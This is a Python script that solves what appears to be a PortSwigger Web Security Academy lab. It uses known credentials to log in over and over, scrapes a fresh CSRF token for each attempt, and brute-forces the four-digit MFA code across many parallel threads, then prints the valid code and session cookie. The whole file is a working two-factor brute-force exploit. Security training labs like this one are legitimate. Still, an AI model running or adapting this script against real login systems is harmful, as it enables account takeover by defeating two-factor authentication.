import re
import threading
import time
import requests

BASE_URL = "https://[lab-id].web-security-academy.net"
USERNAME = "carlos"
PASSWORD = "montoya"

INTERVALS = [
    (i, min(i + 29, 1000))
    for i in range(0, 1001, 30)
]

stop_event = threading.Event()
result_lock = threading.Lock()
print_lock = threading.Lock()

final_result = {
    "code": None,
    "session": None,
    "cookie_session": None,
    "csrf": None,
}


def log(msg):
    with print_lock:
        print(msg)


def register_success(code, session, cookie_session, csrf):
    with result_lock:
        if not stop_event.is_set():
            final_result["code"] = code
            final_result["session"] = session
            final_result["cookie_session"] = cookie_session
            final_result["csrf"] = csrf
            stop_event.set()


def extract_csrf(html):
    match = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return match.group(1) if match else None


def authenticate_and_get_2fa():
    while not stop_event.is_set():
        session = requests.Session()

        resp_get = session.get(f"{BASE_URL}/login")
        if stop_event.is_set():
            return None

        csrf = extract_csrf(resp_get.text)
        if not csrf:
            continue

        resp_post = session.post(
            f"{BASE_URL}/login",
            data={
                "csrf": csrf,
                "username": USERNAME,
                "password": PASSWORD,
            },
            allow_redirects=False,
        )
        if stop_event.is_set():
            return None

        location = resp_post.headers.get("Location", "")
        if resp_post.status_code == 302 and "/login2" in location:
            return session

    return None


def test_single_code(code):
    if stop_event.is_set():
        return False, None, None, None

    session = authenticate_and_get_2fa()
    if not session or stop_event.is_set():
        return False, None, None, None

    resp_get2 = session.get(f"{BASE_URL}/login2")
    if stop_event.is_set():
        return False, None, None, None

    csrf2 = extract_csrf(resp_get2.text)
    if not csrf2:
        return False, None, None, None

    cookie_session = session.cookies.get("session")
    mfa_code = f"{code:04d}"

    resp_post2 = session.post(
        f"{BASE_URL}/login2",
        data={
            "csrf": csrf2,
            "mfa-code": mfa_code,
        },
        allow_redirects=False,
    )
    if stop_event.is_set():
        return False, None, None, None

    incorrect = "Incorrect security code" in resp_post2.text

    if resp_post2.status_code == 302 or (resp_post2.status_code == 200 and not incorrect):
        return True, session, cookie_session, csrf2

    return False, None, None, None


def interval_worker(thread_name, start, end, pause=0.0):
    for code in range(start, end):
        if stop_event.is_set():
            break

        success, valid_session, cookie_session, csrf2 = test_single_code(code)
        if stop_event.is_set() and not success:
            break

        if success:
            mfa_code = f"{code:04d}"
            register_success(mfa_code, valid_session, cookie_session, csrf2)
            log(
                f"\n[{thread_name}] [SUCCESS] MFA: {mfa_code} | "
                f"session: {cookie_session} | csrf: {csrf2}"
            )
            break

        if pause > 0 and not stop_event.is_set():
            time.sleep(pause)


def run_multi_intervals(intervals, pause=0.0):
    threads = []

    for idx, (start, end) in enumerate(intervals, start=1):
        name = f"Thread-{idx}"
        t = threading.Thread(
            target=interval_worker,
            args=(name, start, end, pause),
            name=name,
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return final_result


if __name__ == "__main__":
    res = run_multi_intervals(INTERVALS)

    if res["code"]:
        print("\n--- FINAL RESULT ---")
        print(f"MFA Code   : {res['code']}")
        print(f"Session    : {res['cookie_session']}")
        print(f"CSRF       : {res['csrf']}")
        if res["session"]:
            resp_account = res["session"].get(f"{BASE_URL}/my-account")
            print(f"/my-account: status {resp_account.status_code}")
    else:
        print("\nNo valid code found in configured intervals.")
